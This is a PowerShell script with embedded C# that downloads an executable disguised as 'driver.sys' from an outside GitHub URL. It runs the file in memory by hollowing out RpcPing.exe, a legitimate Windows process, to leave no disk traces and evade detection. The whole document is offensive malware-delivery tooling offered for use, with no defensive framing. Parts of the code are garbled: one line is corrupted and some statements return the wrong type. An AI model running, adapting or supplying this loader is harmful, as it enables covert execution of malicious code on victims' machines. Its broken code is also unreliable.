# TRUE FILELESS LOADER - Zero Disk Writes using Process Hollowing
# Downloads loader and executes via process hollowing (no disk writes)
# Usage: powershell -ExecutionPolicy Bypass -File fileless.ps1

$ErrorActionPreference = "SilentlyContinue"

# URL to download the loader (driver.sys is actually the loader.exe)
$LoaderUrl = "https://github.com/djjdi2djisjioadjiosajiodkdska/cool-stuff/raw/refs/heads/main/driver.sys"

# Win32 API definitions for process hollowing
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class ProcessHollowing {
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public String lpReserved;
        public String lpDesktop;
        public String lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT {
        public uint ContextFlags;
        public ulong P1Home;
        public ulong P2Home;
        public ulong P3Home;
        public ulong P4Home;
        public ulong P5Home;
        public ulong P6Home;
        public uint ContextFlags2;
        public ushort MxCsr;
        public ushort SegCs;
        public ushort SegDs;
        public ushort SegEs;
        public ushort SegFs;
        public ushort SegGs;
        public uint EFlags;
        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;
        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip;
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("ntdll.dll")]
    public static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("ntdll.dll")]
    public static extern int NtSetContextThread(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("ntdll.dll")]
    public static extern int NtResumeThread(IntPtr hThread, out uint SuspendCount);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out UIntPtr lpNumberOfBytesWritten
    );

    [DllImport("ntdll.dll")]
    public static extern int NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint BufferSize,
        out uint NumberOfBytesWritten
    );

    [DllImport("ntdll.dll")]
    public static extern int NtReadVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        IntPtr Buffer,
        uint BufferSize,
        out uint NumberOfBytesRead
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    const uint CREATE_SUSPENDED = 0x00000004;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint CONTEXT_FULL = 0x10007;

    public static string HollowProcess(byte[] peBytes, string targetProcess) {
        IntPtr hProcess = IntPtr.Zero;
        IntPtr hThread = IntPtr.Zero;
        
        try {
            // Parse PE headers
            if (peBytes.Length < 64) {
                return "Error: PE file too small";
            }
            
            int e_lfanew = BitConverter.ToInt32(peBytes, 60);
            if (e_lfanew >= peBytes.Length || e_lfanew < 0) {
                return "Error: Invalid e_lfanew";
            }
            
            // Check DOS signature
            if (BitConverter.ToUInt16(peBytes, 0) != 0x5A4D) {
                return "Error: Invalid DOS signature (not MZ)";
            }
            
            // Check PE signature
            if (BitConverter.ToUInt32(peBytes, e_lfanew) != 0x00004550) {
                return "Error: Invalid PE signature";
            }
            
            // Get ImageBase and SizeOfImage (check if PE32 or PE32+)
            int optionalHeaderOffset = e_lfanew + 24;
            if (optionalHeaderOffset + 2 >= peBytes.Length) {
                return false;
            }
            
            ushort magic = BitConverter.ToUInt16(peBytes, optionalHeaderOffset);
            
            ulong imageBase;
            uint sizeOfImage;
            uint entryPoint;
            
            if (magic == 0x20B) { // PE32+ (64-bit)
                if (optionalHeaderOffset + 64 >= peBytes.Length) return false;
                imageBase = BitConverter.ToUInt64(peBytes, optionalHeaderOffset + 24);
                sizeOfImage = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 56);
                entryPoint = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 16);
            } else if (magic == 0x10B) { // PE32 (32-bit)
                if (optionalHeaderOffset + 64 >= peBytes.Length) return false;
                imageBase = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 28);
                sizeOfImage = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 56);
                entryPoint = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 16);
            } else {
                return "Error: Unknown PE format (not PE32 or PE32+)";
            }
            
            // Create suspended process
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi;
            
            if (!CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero, false, 
                CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi)) {
                int error = Marshal.GetLastWin32Error();
                return "Error: CreateProcess failed (code: " + error + ")";
            }
            
            hProcess = pi.hProcess;
            hThread = pi.hThread;
            
            try {
                // Get thread context
                CONTEXT ctx = new CONTEXT();
                ctx.ContextFlags = CONTEXT_FULL;
                if (!GetThreadContext(pi.hThread, ref ctx)) {
                    int error = Marshal.GetLastWin32Error();
                    TerminateProcess(pi.hProcess, 1);
                    return "Error: GetThreadContext failed (code: " + error + ")";
                }
                
                // Read PEB to get base address (x64: Rdx + 16, which is sizeof(SIZE_T) * 2)
                // Match the C++ code: NtReadVirtualMemory(processInfo->hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &base, sizeof(PVOID), NULL);
                IntPtr pebBaseAddress = new IntPtr((long)(ctx.Rdx + 16)); // sizeof(SIZE_T) * 2 = 8 * 2 = 16
                IntPtr baseAddressPtr = Marshal.AllocHGlobal(8);
                uint bytesRead = 0;
                
                int status = NtReadVirtualMemory(pi.hProcess, pebBaseAddress, baseAddressPtr, 8, out bytesRead);
                if (status != 0 || bytesRead != 8) {
                    Marshal.FreeHGlobal(baseAddressPtr);
                    TerminateProcess(pi.hProcess, 1);
                    return "Error: NtReadVirtualMemory failed (status: 0x" + status.ToString("X") + ", bytes: " + bytesRead + ")";
                }
                
                IntPtr baseAddress = Marshal.ReadIntPtr(baseAddressPtr);
                Marshal.FreeHGlobal(baseAddressPtr);
                
                // Unmap original image if base matches
                if (baseAddress.ToInt64() == (long)imageBase) {
                    NtUnmapViewOfSection(pi.hProcess, baseAddress);
                }
                
                // Allocate memory in target process at preferred base
                IntPtr mem = VirtualAllocEx(pi.hProcess, new IntPtr((long)imageBase), 
                    sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                
                if (mem == IntPtr.Zero) {
                    // Try any address if preferred base not available
                    mem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, sizeOfImage, 
                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                }
                
                if (mem == IntPtr.Zero) {
                    int error = Marshal.GetLastWin32Error();
                    TerminateProcess(pi.hProcess, 1);
                    return "Error: VirtualAllocEx failed (code: " + error + ")";
                }
                
                // Write PE headers using NtWriteVirtualMemory (like the C++ code)
                int sizeOfHeaders = BitConverter.ToInt32(peBytes, optionalHeaderOffset + 60);
                if (sizeOfHeaders > peBytes.Length) {
                    TerminateProcess(pi.hProcess, 1);
                    return false;
                }
                byte[] headerBytes = new byte[sizeOfHeaders];
                Array.Copy(peBytes, 0, headerBytes, 0, sizeOfHeaders);
                
                u                uint bytesWritten = 0;
                status = NtWriteVirtualMemory(pi.hProcess, mem, headerBytes, (uint)sizeOfHeaders, out bytesWritten);
                if (status != 0) {
                    TerminateProcess(pi.hProcess, 1);
                    return "Error: NtWriteVirtualMemory (headers) failed (status: 0x" + status.ToString("X") + ")";
                }
                
                // Write sections
                int numberOfSections = BitConverter.ToUInt16(peBytes, e_lfanew + 6);
                int sizeOfOptionalHeader = BitConverter.ToUInt16(peBytes, e_lfanew + 20);
                int sectionTableOffset = e_lfanew + 24 + sizeOfOptionalHeader;
                
                for (int i = 0; i < numberOfSections; i++) {
                    int sectionOffset = sectionTableOffset + (i * 40);
                    if (sectionOffset + 40 > peBytes.Length) break;
                    
                    uint virtualAddress = BitConverter.ToUInt32(peBytes, sectionOffset + 12);
                    uint sizeOfRawData = BitConverter.ToUInt32(peBytes, sectionOffset + 16);
                    uint pointerToRawData = BitConverter.ToUInt32(peBytes, sectionOffset + 20);
                    
                    if (sizeOfRawData > 0 && pointerToRawData < peBytes.Length) {
                        byte[] sectionData = new byte[sizeOfRawData];
                        int copySize = Math.Min((int)sizeOfRawData, peBytes.Length - (int)pointerToRawData);
                        Array.Copy(peBytes, pointerToRawData, sectionData, 0, copySize);
                        
                        IntPtr sectionAddr = new IntPtr(mem.ToInt64() + virtualAddress);
                        status = NtWriteVirtualMemory(pi.hProcess, sectionAddr, sectionData, 
                            sizeOfRawData, out bytesWritten);
                        if (status != 0) {
                            // Continue anyway, some sections might fail
                        }
                    }
                }
                
                // Update context - set entry point
                ctx.Rcx = (ulong)(mem.ToInt64() + entryPoint);
                
                // Update PEB ImageBase (x64: Rdx + 16)
                IntPtr pebImageBase = new IntPtr((long)(ctx.Rdx + 16));
                byte[] imageBaseBytes = BitConverter.GetBytes(mem.ToInt64());
                status = NtWriteVirtualMemory(pi.hProcess, pebImageBase, imageBaseBytes, 8, out bytesWritten);
                if (status != 0) {
                    TerminateProcess(pi.hProcess, 1);
                    return "Error: NtWriteVirtualMemory (PEB) failed (status: 0x" + status.ToString("X") + ")";
                }
                
                // Set thread context using NtSetContextThread (like C++ code)
                status = NtSetContextThread(pi.hThread, ref ctx);
                if (status != 0) {
                    TerminateProcess(pi.hProcess, 1);
                    return "Error: NtSetContextThread failed (status: 0x" + status.ToString("X") + ")";
                }
                
                // Resume thread using NtResumeThread (like C++ code)
                uint suspendCount = 0;
                status = NtResumeThread(pi.hThread, out suspendCount);
                if (status != 0) {
                    TerminateProcess(pi.hProcess, 1);
                    return "Error: NtResumeThread failed (status: 0x" + status.ToString("X") + ")";
                }
                
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                
                return "Success";
            }
            catch (Exception ex) {
                if (hProcess != IntPtr.Zero) TerminateProcess(hProcess, 1);
                if (hThread != IntPtr.Zero) CloseHandle(hThread);
                if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
                return "Error: Exception - " + ex.Message;
            }
        }
        catch (Exception ex) {
            return "Error: Outer exception - " + ex.Message;
        }
    }
}
"@

# Function to download loader into memory
function Download-LoaderToMemory {
    param([string]$Url)
    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $loaderBytes = $webClient.DownloadData($Url)
        $webClient.Dispose()
        return $loaderBytes
    }
    catch {
        return $null
    }
}

# Main execution - TRUE FILELESS (zero disk writes)
Write-Host "Downloading loader from memory..." -NoNewline
$loaderBytes = Download-LoaderToMemory -Url $LoaderUrl

if ($null -ne $loaderBytes -and $loaderBytes.Length -gt 0) {
    Write-Host " OK" -ForegroundColor Green
    Write-Host "Loader downloaded. Size: $($loaderBytes.Length) bytes" -ForegroundColor Green
    Write-Host "Executing via process hollowing (ZERO disk writes)..." -NoNewline
    
    # Execute via process hollowing - NO DISK WRITES
    $targetProcess = "C:\Windows\System32\RpcPing.exe"
    $result = [ProcessHollowing]::HollowProcess($loaderBytes, $targetProcess)
    
    if ($result -eq "Success") {
        Write-Host " OK" -ForegroundColor Green
        Write-Host "Loader executed successfully - ZERO disk traces!" -ForegroundColor Green
    } else {
        Write-Host " FAILED" -ForegroundColor Red
        Write-Host $result -ForegroundColor Yellow
    }
} else {
    Write-Host " FAILED" -ForegroundColor Red
    Write-Host "Failed to download loader"
}

